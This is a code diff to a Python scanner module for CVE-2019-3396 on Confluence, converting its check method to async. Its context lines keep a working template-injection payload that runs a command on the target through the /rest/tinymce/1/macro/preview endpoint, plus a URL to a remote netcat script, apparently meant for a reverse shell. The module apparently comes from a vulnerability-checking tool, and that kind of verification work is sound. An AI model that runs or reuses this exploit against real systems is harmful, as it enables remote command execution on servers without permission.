@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 import re
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class CVE_2019_3396_BaseVerify:
     def __init__(self, url):
@@ -26,7 +26,7 @@ class CVE_2019_3396_BaseVerify:
         self.py_url = 'https://raw.githubusercontent.com/HoldOnToYourHeart/nc/master/nc.py'
         self.payload = '{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"vm_url","cmd":"exec_cmd"},"body":""}}'
     
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -37,19 +37,13 @@ class CVE_2019_3396_BaseVerify:
         """
 
         try:
-            check_req = request.post(self.url + "/rest/tinymce/1/macro/preview", data = self.payload.replace('vm_url', self.vm_url).replace('exec_cmd', 'echo %swin^dowslin$1ux' % (self.capta)), headers = self.headers)
-            if check_req.status_code == 200 and "wiki-content" in check_req.text:
-                result = re.findall('.*wiki-content">\n(.*)\n            </div>\n', check_req.text, re.S)
+            check_req = await request.post(self.url + "/rest/tinymce/1/macro/preview", data = self.payload.replace('vm_url', self.vm_url).replace('exec_cmd', 'echo %swin^dowslin$1ux' % (self.capta)), headers = self.headers)
+            if check_req.status == 200 and "wiki-content" in await check_req.text():
+                result = re.findall('.*wiki-content">\n(.*)\n            </div>\n', await check_req.text(), re.S)
                 if self.capta in result[0] and ('windows' in result[0] or 'linux' in result[0]):
                     return True
-                else:
-                    return False
-            else:
-                return False
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == '__main__':
